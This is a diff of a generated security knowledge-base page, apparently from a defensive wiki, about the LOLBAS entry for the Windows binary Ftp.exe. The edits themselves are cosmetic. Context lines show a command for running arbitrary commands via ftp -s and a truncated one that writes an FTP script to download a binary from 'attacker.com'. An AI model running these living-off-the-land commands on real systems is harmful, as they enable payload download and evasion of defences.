@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Ftp.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Ftp.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Ftp.exe
-
 A binary designed for connecting to FTP servers
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-12-10
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Ftp.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
 - Use Case: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
 - Privileges: User
 - Operating System: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]
+- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202: Indirect Command Execution]]
 
 ### 2. Download
 
@@ -63,7 +54,7 @@ cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@ech
 - Use Case: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
 - Privileges: User
 - Operating System: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
